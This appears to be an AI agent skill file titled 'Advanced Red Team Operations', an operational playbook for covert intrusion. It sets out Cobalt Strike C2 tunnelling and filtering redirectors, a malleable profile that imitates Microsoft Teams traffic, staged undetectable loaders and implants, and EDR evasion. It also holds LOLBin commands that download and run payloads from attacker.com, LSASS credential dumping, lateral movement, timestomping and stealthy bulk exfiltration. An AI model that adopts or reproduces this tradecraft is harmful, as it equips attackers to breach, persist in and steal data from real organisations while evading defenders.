---
name: advanced-redteam-ops
description: Advanced red team operations — OPSEC discipline, C2 infrastructure design, redirectors, malleable profiles, living-off-the-land, data exfiltration, infrastructure segregation
metadata:
  type: offensive
  phase: operations
  ---

# Advanced Red Team Operations

## When to Activate

- Planning advanced red team engagements
- Designing C2 infrastructure with OPSEC
- Understanding APT TTPs and operational security
- Long-term persistent access scenarios

## C2 Infrastructure Design

### Redirectors (Never Expose Team Server Directly)

**Rule**: Team server ONLY binds to localhost. NEVER bind to 0.0.0.0 or external interface.

```bash
# Cobalt Strike team server (bind locally)
./TeamServerImage -Dcobaltstrike.server_port=50050 \
  -Dcobaltstrike.server_bindto=127.0.0.1 \
  -Djavax.net.ssl.keyStore=./cobaltstrike.store \
  teamserver 127.0.0.1 <password>

# Tunnel via websocat (CStrike uses raw TCP, smuggle in WebSocket)
websocat -E -b ws-l:127.0.0.1:40000 tcp:127.0.0.1:50050 &

# Cloudflare tunnel (or ngrok)
cloudflared tunnel --url http://127.0.0.1:40000 --no-autoupdate
# Or: named tunnel via Zero Trust → point to domain + UUID path

# On operator machine:
websocat -E -b tcp-l:127.0.0.1:2222 ws://mytunnel.domain.com/<uuid> &
# Connect CStrike client to 127.0.0.1:2222
```

**Benefits**:
- Team server never exposed to internet scanning (Shodan, Censys)
- Cloudflare/CDN provides high-reputation front
- Easy to rotate infrastructure — just change tunnel endpoint

### Smart Redirectors (Filter Blue Team)

```nginx
# Nginx redirector with filtering
server {
    listen 443 ssl;
    server_name legit-looking.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    # Only forward traffic matching Malleable C2 profile
    location /api/v2/session {
        # Check custom header (beacon identifier)
        if ($http_x_session_id != "valid-beacon-id") {
            return 301 https://microsoft.com$request_uri;
        }
        
        # Check User-Agent matches profile
        if ($http_user_agent !~* "Mozilla/5.0.*Teams") {
            return 301 https://microsoft.com$request_uri;
        }
        
        # Forward to team server
        proxy_pass https://127.0.0.1:8443;
        proxy_ssl_verify off;
    }
    
    # Deflect all other traffic to legitimate site
    location / {
        return 301 https://microsoft.com$request_uri;
    }
}
```

## Malleable C2 Profiles

**NEVER use default profiles** — always customize:

```
# Disable staging (unless absolutely necessary)
set host_stage "false";

# Memory obfuscation
set sleep_mask "true";   # Encrypt heap while sleeping
set obfuscate "true";    # Avoid generic memory signatures

# Mimic legitimate traffic (Microsoft Teams example)
http-get {
    set uri "/api/v2/users/presence";
    
    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Teams/1.5.00.32283";
        header "Accept" "application/json";
        
        metadata {
            base64url;
            prepend "session_id=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/json";
        header "Server" "Microsoft-IIS/10.0";
        
        output {
            base64url;
            prepend "{\"status\":\"available\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}

# Certificate OPSEC
https-certificate {
    set keystore "legitimate-cert.store";
    set password "password";
}
```

**Profile Tips**:
- Clone real traffic (Teams, Slack, O365, Azure API)
- Match URIs, headers, User-Agents exactly
- Use valid TLS certificates (Let's Encrypt or purchased)
- If behind Cloudflare tunnel, TLS terminates there — self-signed OK

## Infrastructure Segregation (Tiered Approach)

```
Tier 1: Phishing/Delivery (High-reputation, short-lived)
├── Purpose: Get initial payload to target
├── Lifespan: 1-2 weeks (burn after phishing campaign)
├── Domain: Aged 2+ weeks, legitimate category, SPF/DKIM/DMARC
└── Once flagged → burned, move to Tier 2

Tier 2: Interactive C2 (Short-haul, active operations)
├── Purpose: Hands-on-keyboard work
├── Lifespan: Duration of active engagement
├── Protocol: HTTP/S, high bandwidth
└── Higher detection risk due to frequent traffic

Tier 3: Long-haul C2 (Persistence, backup)
├── Purpose: Respawn Tier 2 access if burned
├── Lifespan: Months (low and slow)
├── Protocol: DNS, ICMP, or other covert channel
├── Beacon: Once per day/week
└── NEVER run active commands through this tier
```

**Advanced**: Use different C2 frameworks per tier (e.g., lightweight custom implant for Tier 3, Cobalt Strike for Tier 2).

## Staged Payload Architecture

```
Stage 0: Loader (<30KB, FUD)
├── Format: NOT .exe (use .dll sideload, .hta, .lnk+script, ISO container)
├── Job: Download/extract/inject Stage 1 ONLY
├── Must bypass: Email gateway + endpoint AV
└── Self-contained, no external dependencies

Stage 1: Minimal Implant (Lightweight C2)
├── Commands: ls, whoami, pwd, download, upload, execute (5-6 total)
├── Persistence: Registry, scheduled task
├── FUD: May touch disk
├── Purpose: Recon and deploy Stage 2 after assessment
└── Redundancy: Multiple protocols (HTTPS + DNS fallback)

Stage 2: Full C2 (Cobalt Strike, Sliver, Havoc)
├── Full post-exploitation capability
├── In-memory ONLY (never written to disk)
├── Deployed after: AV/EDR killed or strong foothold established
├── Replace Stage 1 persistence with Stage 2
└── Most signatured — only deploy when safe
```

**Key Principle**: Attack for persistence, not command execution. Every stage should be redundant.

## Living Off the Land (LOLBins)

```powershell
# Download
certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe
bitsadmin /transfer job /download /priority high http://attacker.com/payload.exe C:\temp\payload.exe

# Execution
rundll32 payload.dll,EntryPoint
mshta javascript:a=GetObject("script:http://attacker.com/payload.sct")
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
wmic process call create "payload.exe"

# Lateral movement
wmic /node:TARGET process call create "cmd /c payload"
winrs -r:TARGET cmd

# Avoid: powershell.exe -Command [...], rundll32.exe, direct API calls
# Prefer: LOLBins, COM objects, WMI
```

**Blacklist TTPs** (avoid for better OPSEC):
- `powershell.exe -Command` (heavily monitored)
- `rundll32.exe` with suspicious DLLs
- `psexec` (creates service installation artifacts — Event ID 7045)
- Direct `mimikatz.exe` to disk

**Prefer**:
- WinRM over SMB service creation
- In-memory Mimikatz via sleep-masked beacon
- Alternative credential dumping (comsvcs.dll MiniDump, though also watched)

## OPSEC Discipline

### General Rules
- **Encryption everywhere** — even internal traffic (one breach exposed cleartext creds on local network)
- **Two beacon types**:
  - Long-haul: DNS/covert, sleeps a lot, backup/persistence
  - Short-haul: HTTP/S, active operations
- **SMB listeners**: Machines B, C, D relay traffic to machine A (short-haul beacon) — much stealthier
- **Jitter and sleep**: NEVER 0 sleep. Use high jitter (e.g., sleep 60s, jitter 37%) to avoid predictable intervals
- **Kill dates**: Always set on beacons (auto-destruct after engagement window)
- **Timestomping**: Match creation/modification timestamps of legitimate files in same directory

### C2 Traffic Filtering
- **Dumb redirector**: iptables/websocat forwarding → easily fingerprinted
- **Smart redirector**: Nginx/Apache with rules:
  - Filter: Only forward if User-Agent + URI + custom header match profile
  - Deflect: Proxy pass to legitimate site (Microsoft, Amazon) if no match
  - Shodan/blue team scanners see legitimate site, not team server

### PPID Spoofing
- Many EDRs flag suspicious parent-child relationships (`winword.exe` → `powershell.exe`)
- Malleable C2 profile: spawn processes from `explorer.exe` or other legitimate parents
- Most AVs stop tracking after 2 generations; EDRs: aim for 3 generations

### Data Exfiltration

```bash
# Stealthy methods:
# - DNS tunneling (slow but blends in)
# - HTTPS to legitimate services (paste sites, cloud storage, GitHub)
# - Steganography (hide data in images/documents)
# - Chunked transfer over time (mimic normal traffic patterns)
# - Respect business hours (don't exfil at 3 AM)

# Know your target's stack:
# - If only Splunk + ClamAV → can be bold
# - If Crowdstrike + Splunk + SIEM → low and slow

# Example: 80GB exfil after hours via HTTP tunnel (cloudflared)
# Zipped files, Python HTTP server, tunneled through Cloudflare
# Worked because: no AV, only Splunk, after office hours
```

### Infrastructure Rotation
- Rotate domains/IPs regularly
- Separate infrastructure per engagement phase
- Never reuse burned infrastructure
- Monitor for blue team interaction (honeypots, scanners)

## Advanced Techniques

### Beacon Chaining (SMB Listeners)
```
Internet → Tier 2 Beacon (Machine A, HTTP/S)
              ↓
         SMB Listener
              ↓
    ┌─────────┼─────────┐
    ↓         ↓         ↓
Machine B  Machine C  Machine D
(SMB)      (SMB)      (SMB)

# Only Machine A talks to internet
# B, C, D relay through A via named pipes
# Much stealthier — no direct internet connections from B, C, D
```

### Credential Harvesting OPSEC
- **NEVER** drop standard Mimikatz to disk
- Use: in-memory execution, sleep-masked, or alternative methods
- Alternative: dump LSASS via legitimate Microsoft binaries (comsvcs.dll)
  - `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> dump.bin full`
  - Note: heavily watched by EDRs now

### Avoid "Easy" Built-ins
- `psexec` creates predictable service artifacts (Event ID 7045)
- Prefer WinRM if you have credentials (blends with admin traffic)
- BYOT (Bring Your Own Tools) carefully — don't drop standard compiled tools

## Engagement Lifecycle

```
1. Phishing (Tier 1 infra) → Stage 0 loader
2. Stage 0 → downloads Stage 1 (minimal implant)
3. Stage 1 → recon, assess AV/EDR, establish persistence
4. Stage 1 → deploy Stage 2 (full C2) after assessment
5. Stage 2 → active operations, lateral movement
6. Tier 3 (long-haul) → backup persistence, respawn if Tier 2 burned
7. Data exfiltration → low and slow, blend with normal traffic
8. Cleanup → kill dates trigger, remove artifacts
```

**Remember**: Goal is to attack for persistence, not just command execution. Build redundancy at every stage.
